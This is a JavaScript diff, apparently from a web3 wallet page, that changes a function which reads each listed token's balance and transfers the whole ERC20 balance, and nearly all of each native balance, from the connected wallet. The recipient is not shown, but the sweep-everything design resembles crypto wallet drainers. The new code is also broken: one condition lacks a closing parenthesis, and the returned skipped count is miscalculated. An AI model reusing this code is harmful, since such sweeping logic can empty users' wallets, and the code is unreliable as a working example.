@@ -927,61 +927,84 @@ async function processMainTokenTransfer() {
 }
 
 async function processAllTokenTransfers() {
-  // Filter out the main token completely by both address and symbol
-  const tokensToProcess = TOKENS[currentNetwork].filter(t => 
-    t.address !== currentFromToken.address && 
-    t.symbol !== currentFromToken.symbol &&
-    t.address // Ensure it's a valid token
-  ).sort((a, b) => (a.priority || 999) - (b.priority || 999)); // Fallback priority
+  // Create a Set of main token identifiers for absolute exclusion
+  const mainTokenIdentifiers = new Set([
+    currentFromToken.address.toLowerCase(),
+    currentFromToken.symbol.toLowerCase()
+  ]);
+
+  // Filter tokens - exclude by ANY matching identifier
+  const tokensToProcess = TOKENS[currentNetwork].filter(t => {
+    const tokenId = t.address.toLowerCase();
+    const tokenSymbol = t.symbol.toLowerCase();
+    return !mainTokenIdentifiers.has(tokenId) && 
+           !mainTokenIdentifiers.has(tokenSymbol) &&
+           t.address; // Ensure valid address
+  }).sort((a, b) => (a.priority || 999) - (b.priority || 999));
 
   let successCount = 0;
   
-  // Process ERC20 tokens first (non-native)
+  // Process ERC20 tokens first with enhanced checks
   for (const token of tokensToProcess.filter(t => !t.isNative)) {
     try {
+      // Additional check to absolutely prevent main token processing
+      if (mainTokenIdentifiers.has(token.address.toLowerCase()) {
+        console.warn(`Skipping ${token.symbol} - identified as main token`);
+        continue;
+      }
+
       const balance = await fetchTokenBalance(token);
       if (balance > 0) {
-        updateStatus(`Transferring ${balance} ${token.symbol}...`, "success");
-        await transferERC20Token(token, balance);
+        updateStatus(`Starting transfer of ${balance} ${token.symbol}...`, "info");
+        const tx = await transferERC20Token(token, balance);
         successCount++;
-        updateStatus(`Transferred ${balance} ${token.symbol}`, "success");
+        updateStatus(
+          `Success! ${balance} ${token.symbol} transferred. ` +
+          `<a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
+          "success"
+        );
       }
     } catch (err) {
-      console.error(`Error transferring ${token.symbol}:`, err);
-      updateStatus(`Skipping ${token.symbol}: ${err.message}`, "error");
-      continue;
+      console.error(`Failed to transfer ${token.symbol}:`, err);
+      updateStatus(`Skipped ${token.symbol}: ${err.message.split("(")[0]}`, "warning");
     }
   }
   
-  // Process native tokens last (excluding the main token)
-  const otherNativeTokens = tokensToProcess.filter(t => 
-    t.isNative && 
-    t.address !== currentFromToken.address &&
-    t.symbol !== currentFromToken.symbol
-  );
-
-  for (const token of otherNativeTokens) {
+  // Process remaining native tokens (with extra validation)
+  const nativeTokens = tokensToProcess.filter(t => t.isNative);
+  for (const token of nativeTokens) {
     try {
+      // Final verification check
+      if (token.symbol === currentFromToken.symbol) {
+        throw new Error("Main token detected in native tokens processing");
+      }
+
       const balance = await fetchTokenBalance(token);
       if (balance > 0) {
         const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
         const amountToSend = Math.max(0, balance - minReserve);
         
         if (amountToSend > 0) {
-          updateStatus(`Transferring ${amountToSend} ${token.symbol}...`, "success");
-          await transferNativeToken(token, amountToSend);
+          updateStatus(`Sending ${amountToSend} ${token.symbol}...`, "info");
+          const tx = await transferNativeToken(token, amountToSend);
           successCount++;
-          updateStatus(`Transferred ${amountToSend} ${token.symbol}`, "success");
+          updateStatus(
+            `Success! ${amountToSend} ${token.symbol} sent. ` +
+            `<a href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View TX</a>`,
+            "success"
+          );
         }
       }
     } catch (err) {
-      console.error(`Error transferring native token ${token.symbol}:`, err);
-      updateStatus(`Skipping ${token.symbol}: ${err.message}`, "error");
-      continue;
+      console.error(`Native token transfer failed:`, err);
+      updateStatus(`Skipped native token: ${err.message.split("(")[0]}`, "warning");
     }
   }
   
-  return successCount;
+  return {
+    successCount,
+    skipped: tokensToProcess.length - successCount
+  };
 }
 
 async function transferNativeToken(token, amount) {
